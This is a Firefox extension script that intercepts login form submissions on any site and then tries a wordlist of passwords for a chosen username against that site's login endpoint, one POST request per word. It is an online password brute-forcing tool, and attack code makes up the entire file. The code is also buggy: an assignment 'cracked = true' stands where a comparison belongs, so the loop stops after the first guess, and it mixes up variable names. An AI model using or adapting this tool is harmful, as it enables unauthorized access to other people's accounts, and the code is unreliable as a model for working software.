var isCracking = false;
var windowopen = false;
var types = [];
var pattern = false;
var failpattern;
var crackuser;
var wordlist;
var msgHandler = () => {};
var otherparms = "&";
var cracked = false;

function handleMessage(msg) {
  msgHandler(msg);
}

function cracking_header_listener(e) {
  if((e.originUrl || "").indexOf("moz-extension://") === 0) return e;
  if(!~types.indexOf(e.type)) return e;
  if(pattern && null === e.url.match(RegExp(pattern, "g"))) return e;
  return new Promise(done => {
    var data = {
      method: e.method,
      url: e.url,
      type: e.type,
      headers: []
    };
    e.requestHeaders.forEach(function(header) {
      data.headers.push({
        name: header.name,
        value: header.value
      });
    });
    done({
      requestHeaders: data.headers
    });
  });
}

function cracking_request_listener(e) {
  if((e.originUrl || "").indexOf("moz-extension://") === 0) return e;
  if(!~types.indexOf(e.type)) return e;
  if(pattern && null === e.url.match(RegExp(pattern, "g"))) return e;
  return new Promise(done => {
    var body = [];
    if(e.requestBody && e.requestBody.formData) {
      for(var n in e.requestBody.formData) {
        if(e.requestBody.formData.hasOwnProperty(n)) body.push({
          name: n,
          value: e.requestBody.formData[n][0]
        });
      }
    }
    var data = {
      method: e.method,
      url: e.url,
      type: e.type,
      body: body
    };
    done(e);
    var un_f;
    var pw_f;
    var badpasserror = failpattern;
    var iter;
    data.body.forEach(body => {
      if(body.value === "UN") {
        un_f = body.name;
      //  console.log("Username Feild: " + un_f);
      }
      if(body.value === "PW") {
        pw_f = body.name;
      //  console.log("Pass Feild: " + pw_f);
      } else {
        console.log("Other param: " + body.name);
       otherparams = body.name + "=" + body.valuei + "&" + otherparams;
      }
      console.log(otherparams);
    });
    console.log(e.originUrl);
    var wordbyline = wordlist.split("\n");
    for(iter = 0; iter < wordbyline.length-1; iter++) {
      var xhr = new XMLHttpRequest();
      xhr.open("POST", e.originUrl, true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send(un_f + "=" + crackuser + "&" + pw_f + "=" + wordbyline[iter]);
      xhr.onload  = function crackit(iter) {
        var databack = this.responseText;
        if(databack.length < 5) {
          console.log("Error short page.");
        } else if((databack.match(RegExp(badpasserror), "gi") != null) && (databack.length > 5)) {
//          console.log("Bad password");
        } else if((databack.match(RegExp(badpasserror), "gi") === null) && (databack.length > 5)) {
        cracked = true;
        }
      }
      if(cracked = true) {
        console.log("Broke with Username: " + crackuser);
        console.log("Password: " + wordbyline[iter]);
        stop_cracking_listener();
        break;
      }
  //    console.log("Trying: " + wordbyline[iter]);
    }
  });
}

function stop_cracking_listener() {
  var listening = browser.webRequest.onBeforeSendHeaders.hasListener(cracking_header_listener);
  if(listening) {
    browser.webRequest.onBeforeSendHeaders.removeListener(cracking_header_listener);
    browser.webRequest.onBeforeRequest.removeListener(cracking_request_listener);
  }
}

function start_cracking_listener() {
  browser.webRequest.onBeforeSendHeaders.addListener(cracking_header_listener, {
      urls: ["<all_urls>"]
    },
    ["blocking", "requestHeaders"]);
  browser.webRequest.onBeforeRequest.addListener(cracking_request_listener, {
      urls: ["<all_urls>"]
    },
    ["blocking", "requestBody"]);
}

function user_confirm_cracking() {
  return new Promise(done => {
    browser.windows.create({
      url: "popup.html",
      type: "panel",
      allowScriptsToClose: true
    }).then(w => {
      msgHandler = msg => {
        types = msg.types;
        pattern = msg.docpattern;
        failpattern = msg.failpattern;
        crackuser = msg.crackuser;
        wordlist = msg.wordlist;
        browser.windows.getCurrent().then(wi => {
          browser.windows.remove(wi.id);
          done(msg);
        });
      };
    });
  });
}

function user_modify_headers(data) {
  return new Promise(done => {
    browser.windows.create({
      url: "headers.html?" + encodeURIComponent(JSON.stringify(data)),
      type: "panel",
      allowScriptsToClose: true
    }).then(w => {
      msgHandler = msg => {
        browser.windows.getCurrent().then(wi => {
          browser.windows.remove(wi.id);
          done(msg);
        });
      };
    });
  });
}

function user_modify_body(data) {}

function confirm_and_start_cracking() {
  user_confirm_cracking().then(res => {
    if(res.tamper === true) {
      isCracking = true;
      browser.browserAction.setIcon({
        path: {
          "48": "images/crackedegg.png",
          "32": "images/crackedegg.png",
          "16": "images/crackedegg.png"
        }
      });
      start_cracking_listener();
    }
  });
}

function stop_cracking() {
  isCracking = false;
  browser.browserAction.setIcon({
    path: {
      "48": "images/wholeegg.png",
      "32": "images/wholeegg.png",
      "16": "images/wholeegg.png"
    }
  });
  stop_cracking_listener();
}
browser.runtime.onMessage.addListener(handleMessage);
browser.browserAction.onClicked.addListener(() => {
  if(!isCracking) confirm_and_start_cracking();
  else stop_cracking();
});
